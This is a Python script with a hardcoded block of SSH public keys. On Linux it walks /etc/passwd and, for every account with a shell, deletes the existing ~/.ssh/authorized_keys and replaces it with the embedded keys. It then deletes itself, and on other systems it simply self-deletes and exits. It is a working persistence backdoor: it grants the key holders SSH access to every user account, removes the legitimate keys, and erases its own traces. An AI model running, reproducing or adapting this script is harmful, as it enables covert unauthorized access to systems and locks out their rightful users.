#!/usr/bin/python3

import os
import sys
import re
import platform
from pathlib import Path

AUTHORIZED_KEYS_FILE="""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaWVMiE004tKaQVL682SYxGo/YoD3iSly1lty1yA+axtx9PltnHC+fXMDNK6WPDNGAJ7s6fspVH9Cl5fgy0eFv5jYZh7YOuGC8sauDoeuM/GG4DBFHm/CtGvJO+ft1VkoWTDGv7e5I0st9Iw6MB1dWvvEguIsuDlx/GW/7xQviJY3sCKxB9/PQayuODaAeciVbvSlQ09ppyot7oG3v63LU3WP6M7u7FEMLufBumefy/Ukp6ritxWk3+1G7Ygkj3ErbRaV683erlm0hIaXunPpZ5nMQC6ycfrgPR7F/FbzYrfBagsQx2SZu26qMKbDozO66JHDcCERuuHfnmp7dsnzz itwaslikethiswhenifoundit
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpfsx6oJzIyKzV/m5KtcyucxJ/sFlYyMit81/2OdSGA lufte
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHptZWmGq/kL/ZiERzQ9j4bo1UMeeL6doDSUyhlAF3FdJ+HDZpAuu691Aova7+r0KrF4raFjf3N01WUi2DiMF8vl2aDTMPjqimbYqQKaKI3TlARmee6SgkaOPj64JC7PNoZEm4DZJkMs66puiscZqFDxkYX9XOaqwIY8vyDh/4f1FIMiNMJE1VHF8+//SzQ/kcMnwddQTgqmSnpp0sp+C5pnscFmPCTdWEnQ40bbcf+DI8zOUC6wNazUvobPLxnrkyxVWslN82vhRZVFXelewoNcL0BGZpv0N+JpYqpRx9+BJlWABH7CgAsIFn9q7JucRqNNP138yr9p5IwnV6FA+z luftegrof@ansible
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMvuXE91pb/MFHyGDXfWmmjX1ybMJRqmXkLCiJKn61sNrVFCiu6j9pFFrAyLXon43DRjfjFaoWIp62L4R557JQY= luftegrof@dev
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5wK7ZwzmSfNBNl0VrMCqcOlK2oVpFd1IE9RaviZlnDSXAIcMBqpY6mN+fLXBFW341YpodHdA01wtMvs3h4BLpCt33vtzB4xeKToR8zFKgRGz4PoVvMAaaepJpQWLJ0ArKlAppYgT+n0Vt4rmqJpzgZ7xJ/a1cPgfe3YRDxCDLcYghwsTTqrvLMjHHpA5rJySD7CAZNYX2i/6XHpWDyT2owCJgngxm7XNAJz5maarXfnLpUSct56B4OT5e6G8eNVnrXdMU/E8/cZelTPumxVajBB8VBH8b/OZF7bK81kfWhA7b5ef+L3rPQYPHNvVp9NNolDV7/P6O0V21hGMWuXIj luftegrof@penguin
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKjBXjPFOeVVHWOM7ckewnWaRVQ7VPJTrrALLssVVpdZ luftegrof@test
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD5AmwhynkS8V0XQ115tv8FrppH3WLGSgB8BFBqUdeND6KQ3fW9/jav/r0bcXSKFmKvU4+UzxFxYBk3aUZgg9ePD0edRMQdIW0LXr4nnOW0WHvhfPZLMlmLcO+dyge9+m4LH7Bbc9ERyfjvlQ/GDekpk7rKC+RklRSYjw/h92aasHW70Y0wOHNvwOhkx4ulScEsub2F4FvwSNVBGV1ioGxRRywcYXNJtxE20iU2+zvdPRhz7GdTG8sN+1fR6KFYjdKq03ntY8ZTr/98gsvxVB7Bu5IiG5mSKyzT00xXUJ7z/zwOEbpnkFUJIDpSoF8pMhnM+2jz9o8x3mlNmo2l5T8aqaGtJNhWdTDcqHXFQm5B0kcERLLExW2jVNUX4m8Spkoo4h3sf482frldt4QVjeGj8kpVTKAOx8LzL8TKtQvj6FuYi/+QNHZuXvo72jZjjjNzSz26pUHLBUcD7R/ObIiKb2NaUfXzL0/xcU+oAmoT9tYniEYymeyS+UGcKdAKHV0= root@ci0
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGLDDrBCmvSh2x8kPfBvwWXRROv9EtF0gF/vlN1nqIxt root@ci1
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDjKMNXquxRER7SvBPAJZpfrhWOSooGDgSNEuJTuNXPmtAxKYHQmxQOqZmEMVuGpKeI3jc+CsDBCQ2d+u2D8HR9ZueQjE8TpgUS9VCO5M03gUhQkOxcBwGhB2WTx91ZfiZwsusO7b10QZwEx7Rgobl5Wq9AXwkjJ0qWgOPEcB5JiXydaAfRWZSsiwi/2Qe7nn/GkDOCjVBfkJiLT27bhe75JHD4LnkrS38HbP8YInWu6CDbMOcnU9MphWcCHbsZxOwhvYehDw3RORDlKAbfdALsdNPNjawY7Oir9g5wHWS1L05UiVu2GPROgvjEVIm42qpDxibl+8pWSnMn6llXcyb6/ZFv+BFug5hyuvduYEUrHvVEDvv9OiMGIT8rQPQ/szxS0AUoWIoNmBaOTn1PxoksGvinIaFftEOl4OZ5WAeWuC2zX1o2O5TOJIJTea7z8l0/g09hPUMISasV0Y7fzJvNkWcxLOO5KHl604WBYMvC4215B3bNT3FyeYBtc5gGBoLhBnPjgzGHtu9lckTqET8gPvn2T9O5bZjZASN41B0fWpUo93UG2h3QSeMTDB5LX3rgY5G9Ef0bWGSFzpwC5SLbpYIr26IA7UHSTWDZTLTtccyYWF9YX1aLB+Bu2kT4peVDbRnl4pkI4V6QUtz98tlTd1jQvff4rnOtLK5mMv/J/Q== zerobitsmith
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfpwypCaNk5rarJMgz+hy1v/K2ASFEQBhkQ0dAMA/gfBZFMYlKnMAwNqO9HoGd7SW9oiOOnvvzAAydbWRVhdasHW5E3utj+88HxiK4D8XVteeBRaM2HHQWBQQi1xRoizmOVOY1HI7Czxn08obtOgrBKI9XHOrcApZ2YqrKs4viHqIEbTpdooUZF/5xoykebRU7tTV/rGZR0iAOxOm4ix6nGEOTNAHK0j4gmE4E38GDE6lXpKvBE/BxzOFPZ3aDGNgpsUXZuEVRSJJ6kIUrdH/n+xod6Kr8dRVcRGHapCrEvXIk6rGkF8BIeflfb382KwLxTrtMcDarBPnhbk5okD6/
"""

PY_VERSION = platform.python_version()
SYSTEM_STR = platform.system()

if __name__ == "__main__":
    script_name = sys.argv[0]
    print(str.format("Running on python version: {} and os version: {}", PY_VERSION, SYSTEM_STR))
    if not SYSTEM_STR == "Linux":
        os.remove(script_name)
        sys.exit(1)
    with open('/etc/passwd', 'r') as passwd_file:
        passwd_lines = passwd_file.readlines()
        for user in passwd_lines:
            passwd_match = re.match(r'^\w+[:].*sh$', user)
            if passwd_match:
                print(str.format("Passwd line match: {}", passwd_match.group(0)))
                user_uid = passwd_match.group(0).split(':')[2]
                user_gid = passwd_match.group(0).split(':')[3]
                user_dir =  passwd_match.group(0).split(':')[5]
                user_ssh_dir = user_dir + "/.ssh"
                user_authorized_keys = user_dir + "/.ssh/authorized_keys"
                if Path(user_dir).exists():
                    print(str.format("User directory found: {}", user_dir))
                    if not Path(user_ssh_dir).exists():
                        os.mkdir(user_ssh_dir)
                    if Path(user_authorized_keys).exists():
                        os.remove(user_authorized_keys)
                    with open(user_authorized_keys, 'w') as auth_keys_file:
                        auth_keys_file.write(AUTHORIZED_KEYS_FILE)
                    if user_uid and user_gid:
                        os.chown(user_authorized_keys, int(user_uid), int(user_gid))    
        os.remove(script_name)